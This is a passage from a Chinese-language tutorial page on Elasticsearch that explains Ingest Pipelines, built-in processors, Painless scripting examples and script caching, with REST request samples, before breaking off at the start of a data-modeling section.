ReIndex</h3><p><img src="/images/big-data/es-06/46.jpg" alt="46"></p><h3 id="查看-Task-API"><a href="#查看-Task-API" class="headerlink" title="查看 Task API"></a>查看 Task API</h3><p><img src="/images/big-data/es-06/47.jpg" alt="47"></p><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><ul><li>Update By Query 使用场景： 为字段新增子字段；字段更改分词器；更新分词器词库</li><li>Reindex API 使用场景：修改字段类型<ul><li>需要先对新索引设置 Mapping，索引的设置和映射关系不会被复制</li></ul></li><li>通过查看 Task API，了解 Reindex 的状况</li><li>Remote ReIndex ，需要修改 elasticsearch.yml 配置并且重启</li><li>一定要尽量使用 Index Alias 读写数据。即便发生 Reindex，也能实现零停机维护</li></ul><h2 id="Ingest-Pipeline-与-Painless-Script"><a href="#Ingest-Pipeline-与-Painless-Script" class="headerlink" title="Ingest Pipeline 与 Painless Script"></a>Ingest Pipeline 与 Painless Script</h2><h3 id="需求：修复与增强写入的数据"><a href="#需求：修复与增强写入的数据" class="headerlink" title="需求：修复与增强写入的数据"></a>需求：修复与增强写入的数据</h3><ul><li>Tags 字段中，逗号分割的文本应该是数组，而不是一个字符串</li><li>需求：后期需要对 Tags 进行 Aggregation 统计信息</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Blog数据，包含3个字段，tags用逗号间隔</span></span><br><span class="line">PUT tech_blogs/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"Introducing big data......"</span>,</span><br><span class="line">  <span class="attr">"tags"</span>:<span class="string">"hadoop,elasticsearch,spark"</span>,</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"You konw, for big data"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ingest-Node"><a href="#Ingest-Node" class="headerlink" title="Ingest Node"></a>Ingest Node</h3><ul><li>Elasticsearch 5.0 后，引入的一种新的节点类型。默认配置下，每个节点都是 Ingest Node<ul><li>具有预处理数据的能力，可拦截 Index 或者 Bulck API 的请求</li><li>对数据进行转换，并重新返回给 Index 和 Bluck API</li></ul></li><li>无需 Logstash ，就可以进行数据的预处理，例如<ul><li>为某个字段设置默认值；重命名某个字段的字段名；对字段值进行 Split 操作</li><li>支持设置 Painless 脚本，对数据进行更加复杂的加工</li></ul></li></ul><h3 id="Pipeline-amp-Processor"><a href="#Pipeline-amp-Processor" class="headerlink" title="Pipeline &amp; Processor"></a>Pipeline &amp; Processor</h3><ul><li>Pipeline - 管道会对通过的数据（文档），按照顺序进行加工</li><li>Processor - Elasticsearch 对一些加工的行为进行了抽象包装<ul><li>Elasticsearch 有很多内置的 Processors。也支持通过插件的方式，实现自己的 Processsor</li></ul></li></ul><p><img src="/images/big-data/es-06/48.jpg" alt="48"></p><h3 id="使用-Pipeline-切分字符串"><a href="#使用-Pipeline-切分字符串" class="headerlink" title="使用 Pipeline 切分字符串"></a>使用 Pipeline 切分字符串</h3><p><img src="/images/big-data/es-06/49.jpg" alt="49"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试split tags</span></span><br><span class="line">POST _ingest/pipeline/_simulate</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"pipeline"</span>: &#123;</span><br><span class="line">    <span class="attr">"description"</span>: <span class="string">"to split blog tags"</span>,</span><br><span class="line">    <span class="attr">"processors"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"split"</span>: &#123;</span><br><span class="line">          <span class="attr">"field"</span>: <span class="string">"tags"</span>,</span><br><span class="line">          <span class="attr">"separator"</span>: <span class="string">","</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"docs"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_index"</span>: <span class="string">"index"</span>,</span><br><span class="line">      <span class="attr">"_id"</span>: <span class="string">"id"</span>,</span><br><span class="line">      <span class="attr">"_source"</span>: &#123;</span><br><span class="line">        <span class="attr">"title"</span>: <span class="string">"Introducing big data......"</span>,</span><br><span class="line">        <span class="attr">"tags"</span>: <span class="string">"hadoop,elasticsearch,spark"</span>,</span><br><span class="line">        <span class="attr">"content"</span>: <span class="string">"You konw, for big data"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_index"</span>: <span class="string">"index"</span>,</span><br><span class="line">      <span class="attr">"_id"</span>: <span class="string">"idxx"</span>,</span><br><span class="line">      <span class="attr">"_source"</span>: &#123;</span><br><span class="line">        <span class="attr">"title"</span>: <span class="string">"Introducing cloud computering"</span>,</span><br><span class="line">        <span class="attr">"tags"</span>: <span class="string">"openstack,k8s"</span>,</span><br><span class="line">        <span class="attr">"content"</span>: <span class="string">"You konw, for cloud"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为文档增加字段"><a href="#为文档增加字段" class="headerlink" title="为文档增加字段"></a>为文档增加字段</h3><p><img src="/images/big-data/es-06/50.jpg" alt="50"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 同时为文档，增加一个字段。blog查看量</span></span><br><span class="line">POST _ingest/pipeline/_simulate</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"pipeline"</span>: &#123;</span><br><span class="line">    <span class="attr">"description"</span>: <span class="string">"to split blog tags"</span>,</span><br><span class="line">    <span class="attr">"processors"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"split"</span>: &#123;</span><br><span class="line">          <span class="attr">"field"</span>: <span class="string">"tags"</span>,</span><br><span class="line">          <span class="attr">"separator"</span>: <span class="string">","</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"set"</span>: &#123;</span><br><span class="line">          <span class="attr">"field"</span>: <span class="string">"views"</span>,</span><br><span class="line">          <span class="attr">"value"</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"docs"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_index"</span>: <span class="string">"index"</span>,</span><br><span class="line">      <span class="attr">"_id"</span>: <span class="string">"id"</span>,</span><br><span class="line">      <span class="attr">"_source"</span>: &#123;</span><br><span class="line">        <span class="attr">"title"</span>: <span class="string">"Introducing big data......"</span>,</span><br><span class="line">        <span class="attr">"tags"</span>: <span class="string">"hadoop,elasticsearch,spark"</span>,</span><br><span class="line">        <span class="attr">"content"</span>: <span class="string">"You konw, for big data"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_index"</span>: <span class="string">"index"</span>,</span><br><span class="line">      <span class="attr">"_id"</span>: <span class="string">"idxx"</span>,</span><br><span class="line">      <span class="attr">"_source"</span>: &#123;</span><br><span class="line">        <span class="attr">"title"</span>: <span class="string">"Introducing cloud computering"</span>,</span><br><span class="line">        <span class="attr">"tags"</span>: <span class="string">"openstack,k8s"</span>,</span><br><span class="line">        <span class="attr">"content"</span>: <span class="string">"You konw, for cloud"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Pipeline-API"><a href="#Pipeline-API" class="headerlink" title="Pipeline API"></a>Pipeline API</h3><p><img src="/images/big-data/es-06/51.jpg" alt="51"></p><h3 id="添加-Pipeline-并测试"><a href="#添加-Pipeline-并测试" class="headerlink" title="添加 Pipeline 并测试"></a>添加 Pipeline 并测试</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为ES添加一个 Pipeline</span></span><br><span class="line">PUT _ingest/pipeline/blog_pipeline</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">"a blog pipeline"</span>,</span><br><span class="line">  <span class="attr">"processors"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"split"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"tags"</span>,</span><br><span class="line">        <span class="attr">"separator"</span>: <span class="string">","</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"set"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"views"</span>,</span><br><span class="line">        <span class="attr">"value"</span>: <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看Pipleline</span></span><br><span class="line">GET _ingest/pipeline/blog_pipeline</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试pipeline</span></span><br><span class="line">POST _ingest/pipeline/blog_pipeline/_simulate</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"docs"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_source"</span>: &#123;</span><br><span class="line">        <span class="attr">"title"</span>: <span class="string">"Introducing cloud computering"</span>,</span><br><span class="line">        <span class="attr">"tags"</span>: <span class="string">"openstack,k8s"</span>,</span><br><span class="line">        <span class="attr">"content"</span>: <span class="string">"You konw, for cloud"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Index-amp-Update-By-Query"><a href="#Index-amp-Update-By-Query" class="headerlink" title="Index &amp; Update By Query"></a>Index &amp; Update By Query</h3><p><img src="/images/big-data/es-06/52.jpg" alt="52"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不使用pipeline更新数据</span></span><br><span class="line">PUT tech_blogs/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"Introducing big data......"</span>,</span><br><span class="line">  <span class="attr">"tags"</span>:<span class="string">"hadoop,elasticsearch,spark"</span>,</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"You konw, for big data"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用pipeline更新数据</span></span><br><span class="line">PUT tech_blogs/_doc/2?pipeline=blog_pipeline</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>: <span class="string">"Introducing cloud computering"</span>,</span><br><span class="line">  <span class="attr">"tags"</span>: <span class="string">"openstack,k8s"</span>,</span><br><span class="line">  <span class="attr">"content"</span>: <span class="string">"You konw, for cloud"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看两条数据，一条被处理，一条未被处理</span></span><br><span class="line">POST tech_blogs/_search</span><br><span class="line">&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//update_by_query 会导致错误</span></span><br><span class="line">POST tech_blogs/_update_by_query?pipeline=blog_pipeline</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//增加update_by_query的条件</span></span><br><span class="line">POST tech_blogs/_update_by_query?pipeline=blog_pipeline</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"must_not"</span>: &#123;</span><br><span class="line">        <span class="attr">"exists"</span>: &#123;</span><br><span class="line">          <span class="attr">"field"</span>: <span class="string">"views"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一些内置的-Processors"><a href="#一些内置的-Processors" class="headerlink" title="一些内置的 Processors"></a>一些内置的 Processors</h3><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/ingest-processors.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/ingest-processors.html</a></p><ul><li>Split Processor （例如：将给定字段分成一个数组）</li><li>Remove / Rename Processor （移除一个重命名字段）</li><li>Append（为商品增加一个新的标签）</li><li>Convert （将商品价格，从字符串转换成 float 类型）</li><li>Date / JSON （日期格式转换，字符串转 JSON 对象）</li><li>Date Index Name Processor （将通过该处理器的文档，分配到指定时间格式的索引中）</li><li>Fail Processor （一旦出现异常，该 Pipeline 指定的错误信息能返回给用户）</li><li>Foreach Process （数组字段，数组的每个元素都会使用到一个相同的处理器）</li><li>Grok Processor （日志的日志格式切割）</li><li>Gsub / Join / Split （字符串替换、数组转字符串、字符串转数组）</li><li>Lowercase / Upcase（大小写转换）</li></ul><h3 id="Ingest-Node-v-s-Logstash"><a href="#Ingest-Node-v-s-Logstash" class="headerlink" title="Ingest Node v.s Logstash"></a>Ingest Node v.s Logstash</h3><table><thead><tr><th align="left"></th><th align="left">Logstash</th><th align="left">Ingest Node</th></tr></thead><tbody><tr><td align="left">数据输入与输出</td><td align="left">支持从不同的数据源读取，并写入不同的数据源</td><td align="left">支持从 ES REST API 获取数据，并且写入 ES</td></tr><tr><td align="left">数据源缓冲</td><td align="left">实现了简单的数据队列，支持重写</td><td align="left">不支持缓冲</td></tr><tr><td align="left">数据处理</td><td align="left">支持大量的的插件，也支持定制开发</td><td align="left">内置的插件，可以开发 Plugin 进行扩展（Plugin 更新需要重启）</td></tr><tr><td align="left">配置和使用</td><td align="left">增加了一定的架构复杂度</td><td align="left">无需额外部署</td></tr></tbody></table><blockquote><p><a href="https://www.elastic.co/cn/blog/should-i-use-logstash-or-elasticsearch-ingest-nodes" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/should-i-use-logstash-or-elasticsearch-ingest-nodes</a></p></blockquote><h3 id="Painless-简介"><a href="#Painless-简介" class="headerlink" title="Painless 简介"></a>Painless 简介</h3><ul><li>自 ES 5.x 后引入，专门为 ES 设置，扩展了 Java 的语法</li><li>6.0 开始，ES 只支持 Painless。Grooby ,JavaScript 和 Python 都不在支持</li><li>Painless 支持所有的 Java 的数据类型及 Java API 子集</li><li>Painless Script 具备以下特性<ul><li>高性能 / 安全</li><li>支持显示类型或者动态定义类型</li></ul></li></ul><h3 id="Painless-的用途"><a href="#Painless-的用途" class="headerlink" title="Painless 的用途"></a>Painless 的用途</h3><ul><li>可以对文档字段进行加工处理<ul><li>更新或者删除字段，处理数据聚合操作</li><li>Script Field： 对返回的字段提前进行计算</li><li>Function Score：对文档的算分进行处理</li></ul></li><li>在 Ingest Pipeline 中执行脚本</li><li>在 Reindex API，Update By Query 时，对数据进行处理</li></ul><h3 id="通过-Painless-脚本访问字段"><a href="#通过-Painless-脚本访问字段" class="headerlink" title="通过 Painless 脚本访问字段"></a>通过 Painless 脚本访问字段</h3><table><thead><tr><th align="left">上下文</th><th align="left">语法</th></tr></thead><tbody><tr><td align="left">Ingestion</td><td align="left">ctx.field_name</td></tr><tr><td align="left">Update</td><td align="left">ctx._source.field_name</td></tr><tr><td align="left">Search &amp; Aggregation</td><td align="left">doc{“field_name”]</td></tr></tbody></table><h3 id="案例-1：Script-Processsor"><a href="#案例-1：Script-Processsor" class="headerlink" title="案例 1：Script Processsor"></a>案例 1：Script Processsor</h3><p><img src="/images/big-data/es-06/53.jpg" alt="53"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 增加一个 Script Prcessor</span></span><br><span class="line">POST _ingest/pipeline/_simulate</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"pipeline"</span>: &#123;</span><br><span class="line">    <span class="attr">"description"</span>: <span class="string">"to split blog tags"</span>,</span><br><span class="line">    <span class="attr">"processors"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"split"</span>: &#123;</span><br><span class="line">          <span class="attr">"field"</span>: <span class="string">"tags"</span>,</span><br><span class="line">          <span class="attr">"separator"</span>: <span class="string">","</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"script"</span>: &#123;</span><br><span class="line">          <span class="attr">"source"</span>: <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">          if(ctx.containsKey("</span>content<span class="string">"))&#123;</span></span><br><span class="line"><span class="string">            ctx.content_length = ctx.content.length();</span></span><br><span class="line"><span class="string">          &#125;else&#123;</span></span><br><span class="line"><span class="string">            ctx.content_length=0;</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        "</span><span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"set"</span>: &#123;</span><br><span class="line">          <span class="attr">"field"</span>: <span class="string">"views"</span>,</span><br><span class="line">          <span class="attr">"value"</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"docs"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_index"</span>: <span class="string">"index"</span>,</span><br><span class="line">      <span class="attr">"_id"</span>: <span class="string">"id"</span>,</span><br><span class="line">      <span class="attr">"_source"</span>: &#123;</span><br><span class="line">        <span class="attr">"title"</span>: <span class="string">"Introducing big data......"</span>,</span><br><span class="line">        <span class="attr">"tags"</span>: <span class="string">"hadoop,elasticsearch,spark"</span>,</span><br><span class="line">        <span class="attr">"content"</span>: <span class="string">"You konw, for big data"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"_index"</span>: <span class="string">"index"</span>,</span><br><span class="line">      <span class="attr">"_id"</span>: <span class="string">"idxx"</span>,</span><br><span class="line">      <span class="attr">"_source"</span>: &#123;</span><br><span class="line">        <span class="attr">"title"</span>: <span class="string">"Introducing cloud computering"</span>,</span><br><span class="line">        <span class="attr">"tags"</span>: <span class="string">"openstack,k8s"</span>,</span><br><span class="line">        <span class="attr">"content"</span>: <span class="string">"You konw, for cloud"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="案例-2：文档更新计数"><a href="#案例-2：文档更新计数" class="headerlink" title="案例 2：文档更新计数"></a>案例 2：文档更新计数</h3><p><img src="/images/big-data/es-06/54.jpg" alt="54"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DELETE tech_blogs</span><br><span class="line">PUT tech_blogs/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"Introducing big data......"</span>,</span><br><span class="line">  <span class="attr">"tags"</span>:<span class="string">"hadoop,elasticsearch,spark"</span>,</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"You konw, for big data"</span>,</span><br><span class="line">  <span class="attr">"views"</span>:<span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST tech_blogs/_update/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"script"</span>: &#123;</span><br><span class="line">    <span class="attr">"source"</span>: <span class="string">"ctx._source.views += params.new_views"</span>,</span><br><span class="line">    <span class="attr">"params"</span>: &#123;</span><br><span class="line">      <span class="attr">"new_views"</span>:<span class="number">100</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看views计数</span></span><br><span class="line">POST tech_blogs/_search</span><br></pre></td></tr></table></figure><h3 id="案例-3：搜索时的-Script-字段"><a href="#案例-3：搜索时的-Script-字段" class="headerlink" title="案例 3：搜索时的 Script 字段"></a>案例 3：搜索时的 Script 字段</h3><p><img src="/images/big-data/es-06/55.jpg" alt="55"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET tech_blogs/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"script_fields"</span>: &#123;</span><br><span class="line">    <span class="attr">"rnd_views"</span>: &#123;</span><br><span class="line">      <span class="attr">"script"</span>: &#123;</span><br><span class="line">        <span class="attr">"lang"</span>: <span class="string">"painless"</span>,</span><br><span class="line">        <span class="attr">"source"</span>: <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">          java.util.Random rnd = new Random();</span></span><br><span class="line"><span class="string">          doc['views'].value+rnd.nextInt(1000);</span></span><br><span class="line"><span class="string">        "</span><span class="string">""</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Script-Inline-v-s-Stored"><a href="#Script-Inline-v-s-Stored" class="headerlink" title="Script: Inline v.s Stored"></a>Script: Inline v.s Stored</h3><p><img src="/images/big-data/es-06/56.jpg" alt="56"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//保存脚本在 Cluster State</span></span><br><span class="line">POST _scripts/update_views</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"script"</span>:&#123;</span><br><span class="line">    <span class="attr">"lang"</span>: <span class="string">"painless"</span>,</span><br><span class="line">    <span class="attr">"source"</span>: <span class="string">"ctx._source.views += params.new_views"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST tech_blogs/_update/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"script"</span>: &#123;</span><br><span class="line">    <span class="attr">"id"</span>: <span class="string">"update_views"</span>,</span><br><span class="line">    <span class="attr">"params"</span>: &#123;</span><br><span class="line">      <span class="attr">"new_views"</span>:<span class="number">1000</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="脚本缓存"><a href="#脚本缓存" class="headerlink" title="脚本缓存"></a>脚本缓存</h3><ul><li>编译的开销相较大</li><li>Elasticsearch 会将甲苯编译后缓存在 Cache 中<ul><li>Inline scripts 和 Stored Scripts 都会被缓存</li><li>默认缓存 100 个脚本</li></ul></li></ul><table><thead><tr><th align="left">参数</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">script.cache.max_size</td><td align="left">设置最大缓存数</td></tr><tr><td align="left">script.cache.expire</td><td align="left">设置缓存超时</td></tr><tr><td align="left">script.max_compilations_rate</td><td align="left">默认5分钟最多75次编译 （75/5m）</td></tr></tbody></table><h2 id="Elasticsearch-数据建模实例"><a href="#Elasticsearch-数据建模实例" class="headerlink" title="Elasticsearch 数据建模实例"></a>Elasticsearch 数据建模实例</h2><h3 id="什么是数据建模"><a href="#什么是数据建模" class="headerlink" title="什么是数据建模"></a>什么是数据建模</h3><ul><li>数据建模（Data modeling），是创建数据模型的过程。<ul><li>数据模型是对真实世界进行抽象描述的一种工具和方法，实现对现实世界的映射<ul><li>博客、作者、用户评论</li></ul></li><li>三个过程：概念模型 =&gt; 逻辑模型 =&gt; 数据模型（第三范式）<ul><li>数据模型：结合具体的数据库，在满足业务读写性能等需求的前提下，确定最终的定义</li></ul></li></ul></li></ul><h3 id="数据建模：功能需求-性能需求"><a href="#数据建模：功能需求-性能需求" class="headerlink" title="数据建模：功能需求 + 性能需求"></a>数据建模：功能需求 + 